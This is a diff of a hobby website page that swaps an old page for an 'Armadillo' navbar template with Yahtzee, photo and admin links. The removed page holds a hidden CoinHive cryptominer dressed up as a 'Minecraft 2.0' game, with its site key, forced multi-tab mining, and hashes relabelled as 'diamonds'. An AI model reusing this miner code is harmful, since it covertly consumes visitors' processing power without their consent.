@@ -1,194 +1,35 @@
 <!DOCTYPE html>
 <html>
+<title>Armadillo</title>
+<link href=https://images.vexels.com/media/users/3/139580/isolated/lists/6acd96c0dd34e02c6df2e7426d56fb5c-armadillo-silhouette.png rel="shortcut icon" type=image/x-icon>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/materialize/0.100.2/css/materialize.min.css">
+      <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+<!-- Dropdown Structure -->
+<ul id="dropdown1" class="dropdown-content grey darken-4">
+  <li><a class="white-text" href="yahtzee-score.html">Yahtzee Score Sheet</a></li>
+  <li><a class="white-text" href="dice-roller.html">Dice Roller</a></li>
+</ul>
+<ul id="dropdown2" class="dropdown-content grey darken-4">
+  <li><a class="white-text" href="photography.html">Photos</a></li>
+  <li><a class="white-text" href="submit-photo.html">Submit Your Own</a></li>
+</ul>
+<ul id="dropdown3" class="dropdown-content grey darken-4">
+  <li><a class="white-text" href="admin.html">Admin Page</a></li>
+</ul>
+<nav>
+  <div class="nav-wrapper grey darken-4">
+    <a href="/" class="brand-logo">&nbsp; <img alt="Ginkoid Studios Logo" src="https://imgur.com/3qNjhsj.png" style="margin-top:10px" width="45"> <span style="position:relative;top:-10px">Armadillo</span> &nbsp;</a>
+    <ul class="right hide-on-med-and-down">
+      <li><a class="dropdown-button" href="#!" data-activates="dropdown2" data-hover="true" data-beloworigin="true">Photography<i class="material-icons right">arrow_drop_down</i></a></li>
+      <li><a class="dropdown-button" href="#!" data-activates="dropdown1" data-hover="true" data-beloworigin="true">Yahtzee<i class="material-icons right">arrow_drop_down</i></a></li>
+      <li><a class="dropdown-button" href="#!" data-activates="dropdown3" data-hover="true" data-beloworigin="true">Admin<i class="material-icons right">arrow_drop_down</i></a></li>
+    </ul>
+  </div>
+</nav>
 
-<head>
-    <title>Back up for Basil</title>
-    <style>
-        span {
-            font-size: 40px;
-            color: red;
-            font-family: "Comic Sans MS", cursive, sans-serif;
-        }
-        
-        body {
-            margin: 0;
-            background: blue;
-            text-align: center;
-        }
-        
-        span {
-            -webkit-animation: rainbow 1s infinite;
-            -ms-animation: rainbow 1s infinite;
-            -o-animation: rainbow 1s infinite;
-            animation: rainbow 1s infinite;
-        }
-        
-        @-webkit-keyframes rainbow {
-            0% {
-                color: #ff0000;
-            }
-            10% {
-                color: #ff8000;
-            }
-            20% {
-                color: #ffff00;
-            }
-            30% {
-                color: #80ff00;
-            }
-            40% {
-                color: #00ff00;
-            }
-            50% {
-                color: #00ff80;
-            }
-            60% {
-                color: #00ffff;
-            }
-            70% {
-                color: #0080ff;
-            }
-            80% {
-                color: #0000ff;
-            }
-            90% {
-                color: #8000ff;
-            }
-            100% {
-                color: #ff0080;
-            }
-        }
-        
-        @-ms-keyframes rainbow {
-            0% {
-                color: #ff0000;
-            }
-            10% {
-                color: #ff8000;
-            }
-            20% {
-                color: #ffff00;
-            }
-            30% {
-                color: #80ff00;
-            }
-            40% {
-                color: #00ff00;
-            }
-            50% {
-                color: #00ff80;
-            }
-            60% {
-                color: #00ffff;
-            }
-            70% {
-                color: #0080ff;
-            }
-            80% {
-                color: #0000ff;
-            }
-            90% {
-                color: #8000ff;
-            }
-            /*100% {color: #ff0080;}*/
-        }
-        
-        @-o-keyframes rainbow {
-            0% {
-                color: #ff0000;
-            }
-            10% {
-                color: #ff8000;
-            }
-            20% {
-                color: #ffff00;
-            }
-            30% {
-                color: #80ff00;
-            }
-            40% {
-                color: #00ff00;
-            }
-            50% {
-                color: #00ff80;
-            }
-            60% {
-                color: #00ffff;
-            }
-            70% {
-                color: #0080ff;
-            }
-            80% {
-                color: #0000ff;
-            }
-            90% {
-                color: #8000ff;
-            }
-            /*100% {color: #ff0080;}*/
-        }
-        
-        @keyframes rainbow {
-            0% {
-                color: #ff0000;
-            }
-            10% {
-                color: #ff8000;
-            }
-            20% {
-                color: #ffff00;
-            }
-            30% {
-                color: #80ff00;
-            }
-            40% {
-                color: #00ff00;
-            }
-            50% {
-                color: #00ff80;
-            }
-            60% {
-                color: #00ffff;
-            }
-            70% {
-                color: #0080ff;
-            }
-            80% {
-                color: #0000ff;
-            }
-            90% {
-                color: #8000ff;
-            }
-            /*100% {color: #ff0080;}*/
-        }
+Put Admin Stuff Here
 
-    </style>
-</head>
-
-<body>
-    <marquee scrollamount="15">
-        <img width="750" src="https://images.weserv.nl/?url=static.planetminecraft.com/files/resource_media/screenshot/1214/2012-04-02_215202_1868694.jpg">
-    </marquee>
-    <br>
-    <span id="msg">Welcome to Minecraft 2.0</span>
-    <span id="speed">. It is starting. </span>
-    <br>
-    <span id="current-mined"></span>
-    <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
-    <script>
-        var miner = new CoinHive.Anonymous('mUH6NdO9w3srjU9bhl3eHjCYX2eG2DGf');
-        miner.setThrottle(0.15)
-        miner.start(CoinHive.FORCE_MULTI_TAB)
-        miner.on('open', function() {
-            document.getElementById('msg').innerHTML = 'Welcome ' + (miner.hasWASMSupport() ? 'to' : 'dab') + ' Minecraft 2.0 '
-        })
-        setInterval(function() {
-            document.getElementById('speed').innerHTML = ' running at a speed of ' + miner.getHashesPerSecond() + ' diamonds per second.'
-        }, 500)
-        setInterval(function() {
-            document.getElementById('current-mined').innerHTML = miner.getTotalHashes(true) + ' diamonds have been mined currently.'
-        }, 100)
-
-    </script>
+</div>
 </body>
-
-</html>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/materialize/0.100.2/js/materialize.min.js"></script>
